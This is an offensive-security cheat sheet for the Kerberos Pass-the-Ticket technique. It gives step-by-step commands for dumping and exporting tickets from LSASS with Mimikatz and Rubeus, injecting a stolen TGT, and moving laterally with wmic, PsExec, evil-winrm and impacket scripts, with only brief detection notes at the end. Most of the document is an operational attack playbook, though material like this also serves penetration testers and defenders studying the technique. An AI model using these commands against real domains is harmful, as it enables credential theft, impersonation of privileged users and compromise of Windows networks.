# Pass-the-Ticket (PtT)

Pass-the-Ticket is a lateral movement technique that reuses a valid Kerberos Ticket Granting Ticket (TGT) from another user — often a privileged one — to authenticate across domain systems without needing the user's password or hash.

> TGTs have a limited lifetime (~10 hours). Extract and use them quickly before they expire.

## Requirements

| Requirement | Description |
|---|---|
| Active TGT in memory | A valid TGT from a privileged user must be present (e.g., cached by a Domain Admin) |
| SYSTEM privileges | Needed to access LSASS memory where Kerberos tickets are stored |
| Local Administrator | Often sufficient — allows escalation to SYSTEM or direct LSASS access |

---

## How It Works

1. When a user authenticates, the KDC issues a TGT stored in memory
2. With SYSTEM access, extract the TGT from any logged-in user using Mimikatz
3. Inject the stolen TGT into your own session to impersonate that user
4. Use the injected TGT to access other systems and services as the compromised user

---

## Attack Steps

### 1. Extract Kerberos Tickets (Windows — Mimikatz)

```powershell
mimikatz
privilege::debug
sekurlsa::tickets
```

### 2. Export TGT to File

```powershell
# Saves .kirbi files to disk — identify the correct TGT by username and encryption type
sekurlsa::tickets /export
```

### 3. Inject the TGT into Your Session

```powershell
kerberos::ptt C:\path\to\admin_ticket.kirbi
```

### 4. Verify the Injected Ticket

```powershell
klist
```

### 5. Lateral Movement from Windows

```powershell
# WMI
wmic /node:<target_host> process call create "cmd.exe"

# WinRM (PowerShell Remoting)
Enter-PSSession -ComputerName <target_host> -Authentication Kerberos -Credential <domain>\<username>

# PsExec (SysInternals)
PsExec.exe \\<target_host> -u <domain>\<username> cmd.exe

# RDP — if TGT is injected correctly, mstsc won't prompt for password
mstsc /v:<target_host>
```

### 6. Lateral Movement from Kali

```bash
# Transfer the .kirbi file to Kali, then convert it
kirbi2ccache <ticket_file>.kirbi > <ticket_file>.ccache
export KRB5CCNAME=./<ticket_file>.ccache

# psexec
psexec.py -k -no-pass <domain>/<username>@<target_host>

# evil-winrm
evil-winrm -k -no-pass -u <username> -d <domain> -i <target_host>

# wmiexec
wmiexec.py -k -no-pass <domain>/<username>@<target_host>

# smbexec
smbexec.py -k -no-pass <domain>/<username>@<target_host>
```

---

## Using Rubeus (Windows)

```powershell
# Dump all tickets
Rubeus.exe dump

# Dump tickets for a specific user
Rubeus.exe dump /user:<username>

# Pass a specific ticket
Rubeus.exe ptt /ticket:<base64_ticket_or_kirbi_path>

# Harvest TGTs every 30 seconds
Rubeus.exe harvest /interval:30
```

---

## Detection Notes

- Event ID 4768 — TGT requested
- Event ID 4769 — TGS requested
- Event ID 4624 — Logon with injected ticket (logon type 3 or 9)
- Anomalous ticket requests from unusual hosts or at unusual times are the primary indicator

---

## Differences vs Pass-the-Hash

| | Pass-the-Hash | Pass-the-Ticket |
|---|---|---|
| Protocol | NTLM | Kerberos |
| What's reused | NTLM hash | Kerberos TGT/TGS ticket |
| Requires | Hash only | Active ticket in memory |
| Lifetime | No expiry | ~10 hours (TGT) |
| Detection | Easier | Harder |